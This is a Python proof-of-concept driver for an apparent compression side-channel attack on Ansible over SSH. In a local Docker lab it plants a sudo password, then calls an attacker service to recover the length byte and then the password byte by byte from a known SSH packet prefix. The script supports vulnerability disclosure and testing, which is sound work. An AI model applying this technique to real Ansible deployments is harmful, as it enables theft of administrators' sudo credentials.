"""End-to-end hunter2 recovery for the Ansible SSH compression vulnerability PoC.

Run on the host while `docker compose up -d` is up:

    python run_poc.py

Phases:
  1. Wait for the attacker + client HTTP APIs to come up.
  2. Rotate the victim's sudo password to 'hunter2'.
  3. Phase 1 -- recover the 1-byte CHANNEL_DATA data-length field that
     immediately precedes the sudo password.
  4. Phase 2 -- recover the password byte-by-byte using the now
     fully-known 9-byte prefix.
  5. Compare against the planted password and exit 0 on match.
"""

import json
import sys
import time
import urllib.error
import urllib.request


ATTACKER = "http://127.0.0.1:9000"
CLIENT = "http://127.0.0.1:8000"

# 8 fully-predictable bytes of the CHANNEL_DATA header for the sudo
# password packet:
#   \x5e              SSH_MSG_CHANNEL_DATA (94)
#   \x00\x00\x00\x00  recipient channel = 0 (first session channel, and
#                     with ControlMaster=no in ansible.cfg it's always 0)
#   \x00\x00\x00      high three bytes of the uint32 length field
# The ninth byte -- the password length -- is what Phase 1 recovers.
PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
PHASE1_ALPHABET = "".join(chr(i) for i in range(1, 33))  # length bytes 1..32
PHASE2_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
TARGET = "hunter2"


def http(method: str, url: str, body: dict | None = None,
         timeout: float = 7200.0) -> dict:
    headers = {"Content-Type": "application/json"} if body is not None else {}
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, method=method, data=data, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    return json.loads(raw) if raw else {}


def wait_for(url: str, label: str, timeout: float = 180.0) -> None:
    deadline = time.time() + timeout
    last: Exception | None = None
    while time.time() < deadline:
        try:
            http("GET", url)
            print(f"  [ok] {label} reachable")
            return
        except (urllib.error.URLError, ConnectionResetError, OSError) as exc:
            last = exc
            time.sleep(1.0)
    raise SystemExit(f"!! {label} never came up: {last}")


def step(title: str) -> None:
    print()
    print("=" * 72)
    print(title)
    print("=" * 72)


def main() -> int:
    step("1. Wait for services")
    wait_for(f"{ATTACKER}/status", "attacker")
    wait_for(f"{CLIENT}/status", "client")

    step(f"2. Rotate sudo password to {TARGET!r}")
    r = http("POST", f"{CLIENT}/set_sudo_secret", {"value": TARGET})
    if not r.get("ok"):
        raise SystemExit(f"!! set_sudo_secret failed: {r}")
    print(f"  [ok] sudo password set (length={r['sudo_secret_length']})")

    t0 = time.time()

    step("3. Phase 1 -- recover the CHANNEL_DATA length byte")
    r1 = http("POST", f"{ATTACKER}/run_attack", {
        "known_prefix": PHASE1_PREFIX,
        "alphabet": PHASE1_ALPHABET,
        "max_length": 1,
        "terminator": "\x00",   # not in the alphabet: stop after one byte
        "noise_hints": [1],     # noise length 1 carries the signal here
    })
    if not r1.get("ok") or len(r1["recovered"]) != 1:
        raise SystemExit(f"!! Phase 1 failed: {r1}")
    length_str = r1["recovered"]
    length_byte = ord(length_str)
    password_length = length_byte - 1  # subtract the trailing \n Ansible appends
    print(f"  [ok] length byte = 0x{length_byte:02x} "
          f"(password length = {password_length}) "
          f"({r1['elapsed_seconds']:.1f}s)")

    step("4. Phase 2 -- recover the password byte-by-byte")
    phase2_prefix = PHASE1_PREFIX + length_str    # 9 bytes, fully known
    r2 = http("POST", f"{ATTACKER}/run_attack", {
        "known_prefix": phase2_prefix,
        "alphabet": PHASE2_ALPHABET,
        "max_length": length_byte,
        "terminator": "\n",                        # Ansible appends \n
        "noise_hints": [1] * length_byte,
    })
    if not r2.get("ok"):
        raise SystemExit(f"!! Phase 2 failed: {r2}")
    recovered = r2["recovered"].rstrip("\n")
    elapsed = time.time() - t0

    step("5. Result")
    print(f"  Expected:  {TARGET}")
    print(f"  Recovered: {recovered}")
    print(f"  Total:     {elapsed:.1f}s")
    ok = recovered == TARGET
    print(f"  Status:    {'PASS' if ok else 'FAIL'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
